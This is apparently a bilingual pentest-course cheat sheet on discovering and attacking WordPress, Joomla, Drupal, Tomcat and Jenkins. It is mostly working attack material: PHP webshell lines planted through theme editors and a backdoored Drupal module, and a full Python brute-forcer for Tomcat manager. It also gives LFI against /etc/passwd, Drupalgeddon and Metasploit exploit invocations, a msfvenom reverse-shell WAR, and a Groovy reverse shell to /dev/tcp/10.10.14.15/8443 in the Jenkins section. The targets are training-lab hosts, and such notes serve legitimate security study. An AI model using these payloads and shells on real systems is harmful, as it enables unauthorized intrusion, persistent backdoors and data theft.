# Content Management Systems (CMS) 
---
## WordPress – Discovery & Enumeration

### Introduction

- **WordPress** (2003) → open-source CMS, PHP-based, usually Apache + MySQL.  
- **Extremely popular**: ~32.5% of all sites on the internet.  
- **Highly customizable**, SEO-friendly → but vulnerable through **themes/plugins**.  

**Stats**:  
- 50k+ plugins, 4,100+ themes.  
- 317 versions released.  
- 661+ new WP sites built daily.  
- 120+ languages supported.  
- Hacks: **8% weak passwords**, **60% outdated installs**.  
- Vulnerabilities (per WPScan): 54% plugins, 31.5% core, 14.5% themes.  

**Big names using WordPress**: NYT, eBay, Sony, Forbes, Disney, Facebook, Mercedes-Benz.  

### Discovery / Footprinting

#### `robots.txt`
Exemple typique :
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://site.local/wp-sitemap.xml
```

- Présence de `/wp-admin` + `/wp-content` = **WordPress détecté**.  
- `/wp-admin` → redirige souvent vers `/wp-login.php`.

### Structure
- **Plugins** → `/wp-content/plugins/`  
- **Themes** → `/wp-content/themes/`  

### Types d’utilisateurs
- **Admin** → gestion complète (users, code).  
- **Editor** → gérer/publier posts (même ceux d’autres).  
- **Author** → gérer/publier ses propres posts.  
- **Contributor** → écrire posts, mais pas publier.  
- **Subscriber** → simple utilisateur (lecture + profil).  

➡️ **Accès admin = souvent RCE possible**.

## Enumeration

### Identifier WordPress
`curl -s http://blog.site.local | grep WordPress`

Exemple retour : `<meta name="generator" content="WordPress 5.8" />`

### Identifier le thème
`curl -s http://blog.site.local/ | grep themes`

Exemple retour : `.../wp-content/themes/business-gravity/...`

### Identifier les plugins
`curl -s http://blog.site.local/ | grep plugins`

Exemple retour :  
- **Contact Form 7** (`ver=5.4.2`)  
- **mail-masta** (`ver=1.0.0`)  
- **wpDiscuz** (`ver=7.0.4`)
  
## User Enumeration

- Login page : `/wp-login.php`  

- **User valide + mauvais mot de passe** →  
  `"The password for username admin is incorrect."`

- **User invalide** →  
  `"The username someone is not registered on this site."`

➡️ Fuite d’information → **username enumeration**.  

Exemple : `admin` confirmé.

## Automated Enumeration – WPScan

### Installation
`sudo gem install wpscan`

### Aide
`wpscan -h`

### Exemple scan
`sudo wpscan --url http://blog.site.local --enumerate --api-token TOKEN`

### Résultats typiques
- **Server** → Apache/2.4.41 (Ubuntu).  
- **XML-RPC enabled** → brute-force possible.  
- **readme.html exposé**.  
- **Upload dir listing enabled**.  
- **WordPress version 5.8** (vulnérable REST API, XSS).  
- **Theme Transport Gravity** (child de Business Gravity).  
- **Plugins détectés** : mail-masta (LFI, SQLi), wpDiscuz, Contact Form 7.  
- **Users** : `admin`, `john`.

## Moving On
Avec ces infos, nous pouvons maintenant :  
- Planifier l’exploitation (RCE via plugins, brute-force, LFI/SQLi).  
- Explorer la surface d’attaque restante.  
- Démontrer comment **un simple WordPress mal configuré** mène à **compromission totale**.

---

# Attaquer WordPress

## Bruteforce de connexion

WPScan peut effectuer des attaques par mot de passe (`xmlrpc` ou `wp-login`). `xmlrpc` est généralement plus rapide.

Exemple de commande :
`sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`

Sortie (exemple) :
[!] Valid Combinations Found:  
| Username: john, Password: firebird1

Options importantes :
- `--password-attack` : méthode d'attaque (`xmlrpc` ou `wp-login`)  
- `-U` : utilisateur(s) ou fichier de noms d'utilisateurs  
- `-P` : mot de passe(s) ou fichier de mots de passe  
- `-t` : threads

## Exécution de code via l’éditeur de thème

Avec un compte disposant d'un rôle suffisant (ex. `administrator`), on peut éditer les fichiers du thème depuis Appearance → Theme Editor.

Procédé :
1. Se connecter (ex. `john:firebird1`).  
2. Aller dans Appearance → Theme Editor.  
3. Choisir un thème alternatif (inactif) pour éviter d’endommager le thème principal (ex. `Twenty Nineteen`).  
4. Éditer un fichier comme `404.php` et y ajouter une ligne minimale pour exécution :

`system($_GET[0]);`

Puis appeler la page modifiée :
`curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id"`

Exemple de sortie :
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

## Module Metasploit : `wp_admin_shell_upload`

Metasploit fournit un module `exploit/unix/webapp/wp_admin_shell_upload` qui authentifie sur WordPress, upload un plugin malveillant, le déclenche et ouvre une session Meterpreter PHP.

Exemple de configuration minimale :
- `set USERNAME john`  
- `set PASSWORD firebird1`  
- `set LHOST 10.10.14.15`  
- `set RHOST 10.129.42.195`  
- `set VHOST blog.inlanefreight.local`

Après `exploit`, le module téléverse et exécute le payload ; si tout se passe bien on obtient une session Meterpreter (ou autre reverse shell).

## Exploitation de plugins connus (exemples)

### mail-masta (LFI / SQLi)
Code vulnérable (extrait) :
`include($_GET['pl']);`
Cela permet un Local File Inclusion non filtré. Exemple d'exfiltration :
`curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"`

Résultat attendu : contenu de `/etc/passwd`.

### wpDiscuz (upload bypass → RCE)
Version vulnérable : `7.0.4` (exemple). Le plugin devait seulement autoriser des images mais sa vérification MIME peut être contournée, permettant l'upload d'un webshell `.php`.

Exemple d'utilisation d'un PoC/exploit script (résumé) :
- lancer le script d'exploit ciblant la page de post : `python3 wp_discuz.py -u http://blog.inlanefreight.local -p "/?p=1"`
- si l'upload réussit, le script renvoie l'URL du webshell uploadé, ex. :  
  `http://blog.inlanefreight.local/wp-content/uploads/2021/08/nom-xxxx.php`
- exécuter une commande via :  
  `curl "http://.../nom-xxxx.php?cmd=id"`

Sortie potentielle :
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

# Joomla - Discovery & Enumeration (cheat-sheet)

**But** : repérer rapidement une instance Joomla, en tirer version / composants / points d’entrée exploitables et automatiser l’énumération.

## Quick checks (fingerprint)
- Vérifier meta generator :
  `curl -s http://TARGET/ | grep -i Joomla`
- Robots.txt (indice d’admin) :
  `curl -s http://TARGET/robots.txt | sed -n '1,40p'`
- README / manifest (version) :
  `curl -s http://TARGET/README.txt | head -n 5`
  `curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -`
- Favicon / assets : repérer `/templates/`, `/media/system/js/` et `/administrator/`.

## Common Joomla paths to check
- Admin login : `/administrator/`
- Core manifests : `/administrator/manifests/files/joomla.xml`
- Components / modules / plugins dirs :
  `/components/`, `/administrator/components/`, `/modules/`, `/plugins/`
- Uploads / public files : `/images/`, `/media/`, `/tmp/`
- Licence / readme : `/LICENSE.txt`, `/README.txt`

## Version & component detection
- `joomla.xml` (meilleur endroit) :  
  `curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -`
- Si js/css exposés : grep dans HTML pour `/media/system/js/` ou `/templates/<theme>/`
- Cache manifest : `plugins/system/cache/cache.xml`
- Joomla public stats (global) :  
  `curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool`

## Automated scanners
- **droopescan** (python3) : bon pour reconnaissance
  - install : `sudo pip3 install droopescan`
  - scan : `droopescan scan joomla --url http://TARGET/`
- **JoomlaScan** (legacy, Python2) : parfois utile pour composants anciens
  - (nécessite python2) `python2 joomlascan.py -u http://TARGET/`
- **ffuf / gobuster** pour bruteforce d’URLs :
  `ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/raft-large-directories.txt -c`

## Manual enum tips (rapide)
- Lister fichiers XML exposés :  
  `curl -s http://TARGET/ | grep -oP "/(administrator|components|templates)[^\"']+" | sort -u`
- Tester listing de répertoires : tenter `http://TARGET/wp-content/plugins/` équivalent Joomla (ex : `/templates/<name>/`)
- Chercher fichiers readme/changelog qui fuient versions :
  `curl -s http://TARGET/templates/<theme>/readme.txt | head -n 20`

## Components & vuln hunting
- Repérer composants accessibles (exemples) : `com_ajax`, `com_admin`, `com_actionlogs`
- Récupérer `component.xml` / `admin.xml` si exposés :  
  `curl -s http://TARGET/administrator/components/com_<comp>/ <...>`
- Rechercher vulnérabilités publiques (CVE) pour la version et extensions listées (CVE, Exploit-DB, GitHub)

## Bruteforce admin
- Script bruteforce (exemple) : `sudo python3 joomla-brute.py -u http://TARGET -w /path/wordlist -usr admin`
- Attention : respecter throttling & règles du scope (logs & lockouts).

## Useful one-liners / helpers
- Extraire liens intéressants :
  `curl -s http://TARGET/ | grep -oP '"(?:/administrator|/components|/templates|/plugins)[^"]+' | sort -u`
- Tester l’existence de `joomla.xml` (version) :
  `if curl -s --head http://TARGET/administrator/manifests/files/joomla.xml | head -n1 | grep -q 200; then curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -; fi`
- Récupérer toutes les URLs trouvées pour fuzzing :
  `curl -s http://TARGET/ | hxnormalize -x | hxselect -s '\n' -c a | sed 's/.*href="\([^"]*\)".*/\1/' | sort -u`

## Liens utiles (tools / ressources)
[droopescan](https://github.com/droope/droopescan) 
[JoomlaScan](https://github.com/drego85/JoomlaScan)  
[joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)

---

# Attacking Joomla

## Quick wins / reconnaissance
- Confirmer Joomla + version : `curl -s http://TARGET/ | grep -i Joomla`  
- Admin panel : `/administrator/` → tenter `http://TARGET/administrator/`  
- Vérifier fichiers manifest/readme :  
  `curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -`  
  `curl -s http://TARGET/README.txt | head -n 8`
- Chercher composants/plugins exposés : `curl -s http://TARGET/ | grep -oP '/(components|plugins|templates|administrator)[^"]+' | sort -u`

## Abusing built-in functionality (template editor → RCE)
- Si tu as des credentials admin, tu peux éditer un template et y injecter PHP (accès via UI) :
  1. Login sur `http://TARGET/administrator/`
  2. Dans l’admin : **Extensions** → **Templates** → choisir un template actif/inactif (ex : `protostar`) → **Template: Customize** (ou Editor).  
  3. Ouvrir un fichier PHP (ex : `error.php`) et ajouter :  
     - `system($_GET['cmd']);`  
       (utiliser un param nom improbable pour éviter découverte directe — ex `cmd=abcd1234;id`)  
  4. Sauver → tester :  
     `curl -s "http://TARGET/templates/protostar/error.php?cmd=id"`

**Note UI fix** : si l’admin affiche `Call to a member function format() on null`, désactiver le plugin `Quick Icon - PHP Version Check` sur `?option=com_plugins` pour voir le control panel correctement.

## Leveraging known vulnerabilities (exemples)
- CVE-2019-10945 (Joomla ≤ 3.9.4) : directory traversal & authenticated file deletion.  
  Script (exemple historique) :  
  `python2.7 joomla_dir_trav.py --url "http://TARGET/administrator/" --username admin --password admin --dir /`  
  - **Usage** : lister webroot, récupérer `configuration.php`, etc.  
  - **ATTENTION** : ce script peut détruire des fichiers si mal utilisé (option delete). N’utiliser **que** en scope autorisé.
---

# Drupal - Discovery & Enumeration

## Quick checks
- Vérifier `robots.txt` :  
  `curl -s http://TARGET/robots.txt | sed -n '1,120p'`
- Checker la présence de fichiers d'info :  
  `curl -s http://TARGET/CHANGELOG.txt`  
  `curl -s http://TARGET/README.txt`
- Vérifier l’existence du login /user/login :  
  `curl -I http://TARGET/user/login`

## Automated enumeration (droopescan)
- Installer :  
  `sudo pip3 install droopescan`
- Scan rapide :  
  `droopescan scan drupal -u http://TARGET`
- Options utiles :  
  `droopescan scan drupal -u http://TARGET --enumerate-plugins`
  
## When CHANGELOG.txt blocked
- Si `CHANGELOG.txt` 404 → se fier à `droopescan`, metadata JS/CSS, et `sites/*/*manifest*` quand accessible.

---

# Attacking Drupal

## Leveraging the PHP Filter Module

- Dans les versions < 8 : possibilité d'activer le module *PHP filter*  
- Activer le module via `Administration > Extend` (ou `Reports > Available updates` pour installer le module si Drupal 8+).  
- Créer une page Basic (Content > Add content) et choisir le format `PHP code`.  
- Exemple de snippet PHP (utiliser un paramètre non trivial) : `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>`  
- Accès à la page : `http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id`  
- Pour Drupal 8+, télécharger le module PHP et l'installer : `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`

## Uploading a Backdoored Module

- Télécharger un module existant (ex. CAPTCHA), extraire et ajouter un webshell et un `.htaccess`.  
  - `wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`  
  - `tar xvf captcha-8.x-1.2.tar.gz`  
  - Créer `shell.php` : `<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>`  
  - Créer `.htaccess` :
    
    ```
    <IfModule mod_rewrite.c> 
    RewriteEngine On
    RewriteBase /
    </IfModule>
    ```
  - Ajouter `shell.php` et `.htaccess` au dossier du module, recréer l'archive : `tar cvf captcha.tar.gz captcha/`  
- Installer le module via `Manage > Extend > Install new module` (ou page d'installation) en téléversant l'archive.  
- Exécuter le shell : `http://TARGET/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

## Leveraging Known Vulnerabilities

### Drupalgeddon (CVE-2014-3704)
- Pré-auth SQL injection (Drupal 7.0 → 7.31) permettant, par PoC, la création d'un compte admin.  
- Exemple d'outil PoC : `python2.7 drupalgeddon.py -t http://TARGET -u hacker -p pwnd`  
- Résultat attendu : compte administrateur créé (login/password fournis par le script).

### Drupalgeddon2 (CVE-2018-7600)
- RCE via upload (affecte versions < 7.58 et < 8.5.1).  
- PoC courant : `python3 drupalgeddon2.py` (suivre l'outil pour upload et vérification).  
- Exemple pour écrire un webshell localement avant upload :  
  - `echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64`  
  - puis décoder et écrire : `echo 'BASE64' | base64 -d | tee mrb3n.php`  
- Vérifier l'accès : `http://TARGET/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

### Drupalgeddon3 (CVE-2018-7602)
- RCE authentifié, nécessite une session avec permission de supprimer un node.  
- Module Metasploit : `exploit(multi/http/drupal_drupageddon3)`  
- Paramètres typiques à définir :
``` 
  set RHOSTS <host>  
  set VHOST <vhost> 
  set DRUPAL_SESSION <session_cookie>
  set DRUPAL_NODE <node_id>
  set LHOST <attacker_ip>
```

- Lancer `exploit` pour obtenir une session.

---

# Servlet Containers/Software Development

---

# Tomcat - Discovery & Enumeration

## Overview
Apache Tomcat est un serveur d'applications Java (Servlets/JSP). Il est souvent présent en interne et peut révéler des informations sensibles via pages par défaut (/docs, erreur 404) ou via des managers accessibles avec des identifiants faibles.

## Discovery / Footprinting
- Identifier Tomcat via l'en-tête `Server` sur une réponse HTTP (ou via une page d'erreur qui fuit la version).
- Page docs par défaut : `/docs/` (ex. `Apache Tomcat 9 (9.0.30) - Documentation Index`).
- Exemples d'URI à vérifier :
  - `/docs/`
  - `/examples/`
  - `/manager/`
  - `/host-manager/`
  - `/manager/html` (interface web)
  - `/manager/text` (API HTTP)

## Tomcat filesystem & structure (résumé)
Arborescence typique d'une installation Tomcat :
- `bin`  
- `conf` (ex. `catalina.policy`, `context.xml`, `tomcat-users.xml`, `web.xml`)  
- `lib`  
- `logs`  
- `temp`  
- `webapps` (applications déployées : `manager`, `ROOT`, `customapp`, ...)  
- `work` (cache runtime)

Structure d'une webapp :
```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│  └── context.xml
└── WEB-INF
├── jsp/
│  └── admin.jsp
├── web.xml
├── lib/
│  └── jdbc_drivers.jar
└── classes/
└── com/inlanefreight/api/AdminServlet.class
```
- `WEB-INF/web.xml` = deployment descriptor (servlets, mappings).
- Exemple :
  - `servlet-class` `com.inlanefreight.api.AdminServlet` → fichier de classe attendu : `WEB-INF/classes/com/inlanefreight/api/AdminServlet.class`
- `WEB-INF/classes` et `WEB-INF/lib` peuvent contenir du code et des libs sensibles.

## tomcat-users.xml (credentials & roles)
- `conf/tomcat-users.xml` contient les comptes et rôles pour accéder aux pages `manager` / `host-manager`.
- Rôles usuels :
  - `manager-gui` (GUI manager)
  - `manager-script` (API HTTP)
  - `manager-jmx`
  - `manager-status`
  - `admin-gui`
- Exemple d'entrées (faibles identifiants souvent rencontrés) :
  - `<user username="tomcat" password="tomcat" roles="manager-gui" />`
  - `<user username="admin" password="admin" roles="manager-gui,admin-gui" />`

## Enumeration
- Scanner les répertoires avec Gobuster/dirbuster pour trouver `/docs`, `/manager`, `/host-manager` :
  - `gobuster dir -u http://TARGET:PORT/ -w /usr/share/wordlists/directory-list-2.3-small.txt`
- Tester accès manager avec comptes faibles : `tomcat:tomcat`, `admin:admin`, etc.
- Si authentification réussie sur `/manager`, possibilité de déployer un WAR (upload) contenant un JSP shell pour RCE.
- Endpoints manager utiles :
  - Interface web : `/manager/html`
  - API déploy/undeploy : `/manager/text` (permise selon rôle)

---
# Tomcat - Discovery & Enumeration

## Identification / Fingerprinting
- Tomcat peut apparaître via l'en-tête `Server` ou via une page d'erreur qui divulgue la version.
- `/docs` est souvent présent (ex : `Apache Tomcat 9 (9.0.30) - Documentation Index`).
- Ports courants : HTTP (8080), AJP (8009).

## Fichiers / Emplacements clés
- Arborescence habituelle :
    - `bin/`
    - `conf/` (ex : `catalina.policy`, `catalina.properties`, `context.xml`, `tomcat-users.xml`, `web.xml`)
    - `lib/`
    - `logs/`
    - `temp/`
    - `webapps/` (applications déployées : `manager`, `ROOT`, `...`)
    - `work/` (cache)
- Structure d'une application (exemple) :
    - `webapps/customapp/`
        - `index.jsp`
        - `META-INF/context.xml`
        - `WEB-INF/`
            - `web.xml` (deployment descriptor)
            - `classes/` (ex : `com/inlanefreight/api/AdminServlet.class`)
            - `lib/` (JARs)
            - `jsp/` (JSP pages)
- `WEB-INF/web.xml` contient mappages de servlets et chemins (sensible).
- `conf/tomcat-users.xml` contient utilisateurs/roles (ex : `tomcat:tomcat`, `admin:admin`).

## web.xml (exemple)
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">
    <web-app>
      <servlet>
        <servlet-name>AdminServlet</servlet-name>
        <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
      </servlet>
      <servlet-mapping>
        <servlet-name>AdminServlet</servlet-name>
        <url-pattern>/admin</url-pattern>
      </servlet-mapping>
    </web-app>

## tomcat-users.xml (extrait type)
    <tomcat-users ...>
      <role rolename="manager-gui" />
      <user username="tomcat" password="tomcat" roles="manager-gui" />
      <role rolename="admin-gui" />
      <user username="admin" password="admin" roles="manager-gui,admin-gui" />
    </tomcat-users>

## Enumeration
- Rechercher `/docs`, `/manager`, `/host-manager`.
- Exemple de scan de répertoires : `gobuster dir -u http://host:8180/ -w /usr/share/wordlists/...`
- Vérifier AJP et version : `nmap -sV -p 8009,8080 host`
- Inspecter présence des pages d'administration et fichiers de déploiement (`/manager/html`, `/host-manager`).

# Attacking Tomcat

## Tomcat Manager - Login Brute Force
- Cible : `/manager/html` (rôle `manager-gui`) ou `/host-manager`.
- Exemple Metasploit : module `auxiliary/scanner/http/tomcat_mgr_login`
    - options typiques : `VHOST`, `RPORT` (ex 8180), `rhosts`, `STOP_ON_SUCCESS true`, wordlists fournis.
- Méthode alternative :
    - arguments : `-U URL -P PATH -u USERNAMES -p PASSWORDS`
    - logique : tentative `requests.get(new_url, auth=(u,p))` et stop si `r.status_code == 200`.

### Script brute force
  ```python
    #!/usr/bin/python
    import requests
    from termcolor import cprint
    import argparse

    parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

    parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
    parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
    parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
    parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

    args = parser.parse_args()
    url = args.url
    uri = args.path
    users_file = args.usernames
    passwords_file = args.passwords

    new_url = url + uri
    f_users = open(users_file, "rb")
    f_pass = open(passwords_file, "rb")

    usernames = [x.strip() for x in f_users]
    passwords = [x.strip() for x in f_pass]

    cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

    for u in usernames:
        for p in passwords:
            r = requests.get(new_url,auth = (u, p))
            if r.status_code == 200:
                cprint("\n[+] Success!!", "green", attrs = ['bold'])
                cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
                break
        if r.status_code == 200:
            break
    if r.status_code != 200:
        cprint("\n[+] Failed!!", "red", attrs = ['bold'])
  ```

## Tomcat Manager - WAR File Upload (post-auth)
- Si accès manager GUI (`manager-gui`), possibilité de déployer un WAR (Web Application Archive).
- Créer un WAR contenant un JSP webshell (ex : `cmd.jsp`) :
    - JSP webshell example (cours) : exécute `Runtime.getRuntime().exec(request.getParameter("cmd"))` et affiche sortie.
- Packaging : `zip -r backup.war cmd.jsp`
- Déployer via `/manager/html` (Browse -> Deploy).
- Résultat : accès à `/backup/cmd.jsp?cmd=id` ou similaire.
- Alternative msfvenom : `msfvenom -p java/jsp_shell_reverse_tcp LHOST=... LPORT=... -f war > backup.war`

## Ghostcat (CVE-2020-1938)
- Vulnérabilité AJP permettant LFI semi-authenticated/unauthenticated sur versions Tomcat < 9.0.31, < 8.5.51, < 7.0.100.
- AJP service typiquement sur port 8009.
- Vérifier avec `nmap -sV -p 8009,8080 host`.
- Exploit (PoC) permet lecture de fichiers/folders dans `webapps` (ex : `WEB-INF/web.xml`).
- Exemple d'utilisation du PoC (cours) : `python2.7 tomcat-ajp.lfi.py target -p 8009 -f WEB-INF/web.xml`

# Ressources — Tomcat / outils & scripts cités
- [tomcat AJP / Ghostcat — recherche PoC sur GitHub](https://github.com/search?q=ghostcat+tomcat+ajp) 
- [script de brute-force simple mgr_brute.py](https://github.com/search?q=tomcat+mgr+brute+python)
- [exemple PoC tomcat-ajp LFI — recherche sur GitHub](https://github.com/search?q=tomcat+ajp+lfi) 

---

# Jenkins - Discovery & Enumeration

Jenkins est un serveur d'automatisation open-source (Java) utilisé pour l'intégration continue et le déploiement.

## Discovery / Footprinting

- Jenkins tourne souvent dans un conteneur servlet (ex. Tomcat) et écoute par défaut sur le port `8080`.  
- Un port supplémentaire est utilisé pour la communication master/slave (ex : `5000`).  
- Modes d'authentification possibles : base Jenkins (Jenkins’ own user database), LDAP, délégation au container, ou aucune auth.  
- Installation par défaut : base utilisateur Jenkins et généralement **inscription désactivée** (les comptes sont créés par un administrateur).  
- Détection rapide : page de connexion Jenkins (UI caractéristique) — repérer le `/login` ou l'interface web sur `:8080`.  
*Il est courant de trouver des instances internes avec des cred faibles ou sans authentification*

## Enumeration

- Vérifier l'accès HTTP(S) à l'URL Jenkins (ex. `http://HOST:8080/`) et la présence de la page de login.  
- Tester l'accès non-authentifié (parfois Jenkins est ouvert).  
- Scanner les ports pertinents : `8080` (UI), `5000` (slave port).  
- Rechercher des indices dans l'interface (version, plugins exposés via la page, endpoints REST ou script consoles si accessibles).  

---

# Jenkins - Discovery & Enumeration

Jenkins est un serveur d'intégration continue écrit en Java. Il tourne souvent dans des conteneurs servlet (ex : Tomcat) et expose par défaut l'interface web sur le port `8080` (et `5000` pour les agents/slaves). On le repère rapidement via sa page de login dédiée (`/login` ou `/jenkins`) ou en observant la page d'accueil qui retourne une UI Jenkins.

**Points clés du cours**
- Jenkins peut fonctionner sans authentification, ou avec des comptes faibles (`admin:admin`) — vérifiez toujours la page de login.
- Jenkins expose une *Script Console* accessible via `/script` qui permet d’exécuter des scripts Groovy dans le runtime Jenkins (très puissant si accessible).
- Jenkins est souvent exécuté en tant que `root` / `SYSTEM` sur certaines installations — un RCE sur le master peut donc donner des privilèges très élevés.

---

# Attacking Jenkins

## Script Console
- URL console : `http://<jenkins>/script`
- Exemple (exécute `id`) — format Groovy :
  - `def cmd = 'id'`
  - `def sout = new StringBuffer(), serr = new StringBuffer()`
  - `def proc = cmd.execute()`
  - `proc.consumeProcessOutput(sout, serr)`
  - `proc.waitForOrKill(1000)`
  - `println sout`

- Exemple reverse shell (Linux) — Groovy :
  - `r = Runtime.getRuntime()`
  - `p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])`
  - `p.waitFor()`

- Exemple simple Windows (commande) :
  - `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");`

## Vulnérabilités
- Chaînage de deux vulnérabilités (`CVE-2018-1999002` + `CVE-2019-1003000`) permettant RCE *pre-auth* via contournement du sandbox de compilation des scripts.
- Contournement de l’ACL `Overall/Read` via un mécanisme de routing dynamique (permet d’exécuter un Groovy qui télécharge/charge un JAR malveillant).
- RCE en 2.150.2 via Node.js si les droits `create job` + `build` sont disponibles (auth requis, mais si `anonymous` a ces droits l’exploit réussit).

# Ressources
- [Advisory / article (Alert Logic) - Jenkins plugins RCE tracking](https://www.alertlogic.com/blog/emerging-threat-jenkins-plugins-remote-code-execution)  
- [SNYK - CVE-2019-1003000 (Script Security Plugin sandbox bypass)](https://security.snyk.io/vuln/SNYK-RHEL7-JENKINS2PLUGINS-5257791)  

---






